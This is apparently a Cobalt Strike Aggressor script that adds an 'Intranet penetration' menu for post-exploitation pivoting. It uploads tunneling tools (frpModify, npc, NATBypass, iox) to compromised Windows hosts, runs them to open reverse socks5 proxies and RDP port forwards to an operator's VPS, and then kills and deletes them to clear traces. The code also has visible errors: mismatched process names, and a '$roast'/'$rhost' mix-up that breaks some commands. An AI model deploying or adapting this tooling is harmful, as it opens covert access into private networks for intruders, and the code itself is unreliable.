menu "Intranet penetration" {
	menu "frpModify (no need to land frpc.ini)" {
		item "upload frpc" {
			$bid = $1;
			$dialog = dialog("upload frpc", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &frp_upload);
			dialog_description($dialog,"frp specifies the parameter version (no need for frpc.ini landing). Project address: https://github.com/uknowsec/frpModify");
			drow_text($dialog, "UploadPath", "Upload Path: ");
			dbutton_action($dialog, "Upload");
			dialog_show($dialog);
		}
		sub frp_upload {
			bcd($bid, $3['UploadPath']);
			if (-is64 $bid['id']) {
				bupload($bid, script_resource("/scripts/Intranet agent/x64/frpmodify.exe"));
			}else{
				bupload($bid, script_resource("/scripts/Intranet agent/x86/frpmodify.exe"));
			}
		}
		item "Run frpc" {
			$bid = $1['@'];
			$dialog = dialog("run frpc",%(ip => "x.x.x.x", port => "2333",bid => $bid),&frpc_run);
			dialog_description($dialog, "Run frpc, use frpModify, specify the parameters, socks5 port is 23333.");
			drow_text($dialog, "ip", "ip: ");
			drow_text($dialog, "port", "port: ");
			dbutton_action($dialog, "Run");
			dialog_show($dialog);
		}
		sub frpc_run{
			local('$Name $port');
			$Name = $3['ip'];
			$port = replace($3['port'], "\"", "");
			bshell($bid, "frpmodify.exe -t  $+ $Name -p  $+ $port");
		}
		item "stop frpc" {
			local('$bid');
			foreach $bid ($1){
				bshell($1, "taskkill -f /im frpmodift.exe");
			}
		}
		item "remove frpc" {
			local('$bid');
			foreach $bid ($1){
				bshell($1, "taskkill -f /im frpmodift.exe & del /f /s /q frpmodify.exe");
			}
		}
	}

	menu "nps (no configuration file landing)" {
		item "upload npc" {
			$bid = $1;
			$dialog = dialog("upload npc", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &npc_upload);
			dialog_description($dialog,"A lightweight, high-performance, and powerful intranet penetration proxy server. It supports almost all traffic forwarding such as tcp, udp, socks5, http, etc. Use reference: https://mp.weixin. qq.com/s/zI04_kxVFWdnegctAzNmmg. Project address: https://github.com/ehang-io/nps");
			drow_text($dialog, "UploadPath", "Upload Path: ");
			dbutton_action($dialog, "Upload");
			dialog_show($dialog);
		}
		sub npc_upload {
			bcd($bid, $3['UploadPath']);
			bcd($bid, $3['UploadPath']);
			bupload($bid, script_resource("/scripts/Intranet agent/npc.exe"));
		}
		item "Run npc" {
			$bid = $1['@'];
			$dialog = dialog("run npc",%(server => "ip:8024", vkey => "",bid => $bid),&npc_run);
			dialog_description($dialog, "Run npc, no configuration file landing, use reference: https://mp.weixin.qq.com/s/zI04_kxVFWdnegctAzNmmg.");
			drow_text($dialog, "server", "server: ");
			drow_text($dialog, "vkey", "vkey: ");
			dbutton_action($dialog, "Run");
			dialog_show($dialog);
		}
		sub npc_run{
			local('$server $vkey');
			$server = $3['server'];
			$vkey = replace($3['vkey'], "\"", "");
			bshell($bid, "npc.exe -server= $+ $server -vkey= $+ $vkey");
		}
		item "stop npc" {
			local('$bid');
			foreach $bid ($1){
				bshell($1, "taskkill -f /im npc.exe");
			}
		}
		item "Delete npc" {
			local('$bid');
			foreach $bid ($1){
				bshell($1, "taskkill -f /im npc.exe & del /f /s /q npc.exe");
			}
		}
	}

	menu "NATBypass (Port Forwarding)" {
		item "upload nb" {
			$bid = $1;
			$dialog = dialog("upload nb", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &nb);
			dialog_description($dialog,"An implementation of lcx under golang. Project address: https://github.com/cw1997/NATBypass");
			drow_text($dialog, "UploadPath", "Upload Path: ");
			dbutton_action($dialog, "Upload");
			dialog_show($dialog);
		}
		sub nb {
			bcd($bid, $3['UploadPath']);
			if (-is64 $bid['id']) {
				bupload($bid, script_resource("/scripts/Intranet agent/x64/nb.exe"));
			}else{
				bupload($bid, script_resource("/scripts/Intranet agent/x86/nb.exe"));
			}
		}
		item "Run nb" {
			$bid = $1['@'];
			$dialog = dialog("run nb",%(lhost => "127.0.0.1:3389", rhost => "x.x.x.x:1997",bid => $bid),&nb_run);
			dialog_description($dialog, "vpsrun ：./nb -listen 1997 2017");
			drow_text($dialog, "lhost", "Local IP:Port ");
			drow_text($dialog, "rhost", "Public IP:Port ");
			dbutton_action($dialog, "Run");
			dialog_show($dialog);
		}
		sub nb_run{
			local ('$lhost $roast');
			$lhost = $3['lhost'];
			$rhost = replace($3['rhost'], "\"", "");
			bshell($bid, "nb.exe -slave  $+ $lhost  $+ $rhost");
		}
		item "stop nb" {
			local('$bid');
			foreach $bid ($1){
				bshell($1, "taskkill -f /im nb.exe");
			}
		}
		item "delete nb" {
			local('$bid');
			foreach $bid ($1){
				bshell($1, "taskkill -f /im nb.exe & del /f /s /q nb.exe");
			}
		}
	}

	menu "iox (port forwarding and socks5)" {
		item "Upload iox" {
			$bid = $1;
			$dialog = dialog("upload iox", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &iox);
			dialog_description($dialog,"Port forwarding tool and socks5 proxy. Project address: https://github.com/EddieIvan01/iox");
			drow_text($dialog, "UploadPath", "Upload Path: ");
			dbutton_action($dialog, "Upload");
			dialog_show($dialog);
		}
		sub iox {
			bcd($bid, $3['UploadPath']);
			if (-is64 $bid['id']) {
				bupload($bid, script_resource("/scripts/Intranet agent/x64/iox.exe"));
			}else{
				bupload($bid, script_resource("/scripts/Intranet agent/x86/iox.exe"));
			}
		}
		item "Run iox(fwd)" {
			$bid = $1['@'];
			$dialog = dialog("run iox",%(lhost => "192.168.0.100:3389", rhost => "*x.x.x.x:3389", hex => "656565",bid => $bid),&iox_fwdrun);
			dialog_description($dialog, "vpsrun ：./iox fwd -l *3389 -l 33890 -k 656565");
			drow_text($dialog, "lhost", "Local IP:Port ");
			drow_text($dialog, "rhost", "Public IP:Port ");
			drow_text($dialog, "hex", "Traffic encryption key: ");
			dbutton_action($dialog, "Run");
			dialog_show($dialog);
		}
		sub iox_fwdrun{
			local ('$lhost $roast $hex');
			$lhost = $3['lhost'];
			$rhost = replace($3['rhost'], "\"", "");
			$hex = $3['hex'];
			bshell($bid, "iox.exe fwd -r  $+ $lhost -r  $+ $rhost -k  $+ $hex");
		}

		item "Run iox(proxy)"{
			$bid = $1['@'];
			$dialog = dialog("run iox",%(rhost => "*x.x.x.x:9999", hex => "000102",bid => $bid),&iox_proxyrun);
			dialog_description($dialog, "vps first create service: ./iox proxy -l *9999 -l 1080 -k 000102");
			drow_text($dialog, "rhost", "Public IP:Port ");
			drow_text($dialog, "hex", "Traffic encryption key: ");
			dbutton_action($dialog, "Run");
			dialog_show($dialog);
		}
		sub iox_proxyrun{
			local ('$roast $hex');
			$roast = $3 ['roast'];
			$hex = replace($3['hex'], "\"", "");
			bshell($bid, "iox.exe proxy -r  $+ $rhost -k  $+ $hex");
		}

		item "stop iox"{
			local('$bid');
			foreach $bid ($1){
				bshell($1, "taskkill -f /im iox.exe");
			}
		}
		item "delete iox"{
			local('$bid');
			foreach $bid ($1){
				bshell($1, "taskkill -f /im iox.exe & del /f /s /q iox.exe");
			}
		}
	}

}